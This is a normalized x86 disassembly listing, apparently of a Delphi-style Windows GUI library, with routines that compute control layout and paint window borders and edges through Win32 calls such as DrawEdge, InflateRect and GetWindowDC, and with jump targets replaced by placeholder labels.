cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax ] ebx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x78 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x10 ]
cmp [ edx ] 0x0
jle r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
mov ebx [ ebp + 0xc ]
cmp eax [ ebx ]
jg r-xdata
add [ edx ] eax
mov eax [ esi + 0x78 ]
mov eax [ eax + 0xc ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x14 ]
cmp [ ecx ] 0x0
jle r-xdata
mov ebx [ ebp + 0xc ]
sub [ ebx ] eax
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx ]
jg r-xdata
add [ ecx ] eax
mov ebx [ ebp + 0x8 ]
sub [ ebx ] eax
sub_458cb4
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_458904
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4546e8
test eax eax
je r-xdata
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
lea eax [ ebp - 0x5e ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_459126
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4546e8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_458bf0
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub edx eax
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
add edx [ ebp - 0x44 ]
sub edx eax
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov [ ebp - 0x4e ] 0x0
jmp r-xdata
mov [ ebp - 0x4e ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x4e ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
movzx eax [ ebp - 0x4d ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub edx eax
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x4e ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
add edx [ ebp - 0x4c ]
sub edx eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov [ ebp - 0x4e ] 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x30 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x34 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4e ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x44 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x38 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_45913d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_458cb4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4519e8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45917c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_452e0c
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_45017c
cmp [ edi + 0x160 ] 0x0
jne r-xdata
sub_4591c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ff0
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x160 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4591f4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc0 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax [ ebp - 0x4 ]
call sub_454204
xor edx edx
push ebp
push sub_459322
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4546e8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459329
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
inc ebx
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
test dl dl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x34 ]
jmp r-xdata
add dl 0xfd
sub dl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec ebx
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
sub dl 0x3
jae r-xdata
xor esi esi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4546ac
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edi edi
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x30 ]
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx edi
mov edx [ eax + 0x40 ]
sub edx esi
mov esi [ eax ]
call [ esi + 0x88 ]
sub_459329
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x30 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
sub_4593bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x19c ]
neg eax
push eax
mov edx [ ebx + 0x19c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x195 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x193 ] 0x0
je r-xdata
cmp [ ebx + 0x194 ] 0x0
je r-xdata
add eax [ ebx + 0x198 ]
mov esi edi
test [ ebx + 0x192 ] 0x1
je r-xdata
add eax [ ebx + 0x198 ]
test [ ebx + 0x192 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x192 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x192 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_45944c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4596ff
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
mov ebx eax
test ebx 0x200000
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
jbe r-xdata
test ebx 0x100000
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_432a84
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
je r-xdata
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax 0x1
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x193 ]
test dl dl
je r-xdata
call sub_432228
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4328fc
lea edx [ ebp - 0x1c ]
push edx
mov edx [ ebp - 0x8 ]
push eax
call GetRgnBox
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push 0x0
call MapWindowPoints
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
mov eax [ ebp - 0x38 ]
neg eax
push eax
mov eax [ ebp - 0x3c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x194 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x198 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_424fec
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ReleaseDC
retn
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
add esi [ ecx + 0x198 ]
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x8
je r-xdata
add [ ebp - 0x24 ] esi
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x192 ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x195 ]
or ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1d9 ]
or ecx [ ebx * 4 + rw-data ]
or ecx 0x2000
push ecx
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
add [ ebp - 0x20 ] esi
sub_45973c
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0xc ]
mov eax esi
call sub_4503d4
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax esi
call sub_455430
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_451b4c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_453238
sub_4597b4
push ebx
mov ebx edx
mov dl 0x1
call sub_43bd90
test eax eax
je r-xdata
pop ebx
retn
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x10002
mov edx 0x127
call sub_451b4c
jmp r-xdata
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x20002
mov edx 0x127
call sub_451b4c
add ebx 0xffffffed
sub bx 0x4
jae r-xdata
sub_459800
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459869
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_455d50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459894
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45988c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4598ec
push esi
mov esi eax
mov ecx [ eax + 0x30 ]
jmp r-xdata
cmp [ esi + 0x94 ] 0x0
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
pop esi
retn
and edx 0x7f
push edx
mov ecx eax
mov eax esi
mov edx 0xb046
call sub_450430
mov esi ecx
mov ecx [ ecx + 0x30 ]
sub_459930
push ebx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
pop ebx
retn
sub_459960
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx [ esi + 0x94 ]
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_457040
dec eax
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_459998
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
test bl bl
je r-xdata
and [ ebp + 0x54 ] 0xdfff
or [ ebp + 0x54 ] 0x2000
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x1d0 ]
test eax eax
je r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebp + 0x1d0 ]
call sub_419898
mov edx ebx
call sub_459998
inc edi
dec esi
jne r-xdata
sub_4599e4
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
test [ ebx + 0x1c ] 0x2
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x48 ]
mov [ esi ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4 ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x242 ]
mov [ esi ] eax
mov eax [ ebx + 0x246 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_459a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov [ ebp - 0x5 ] al
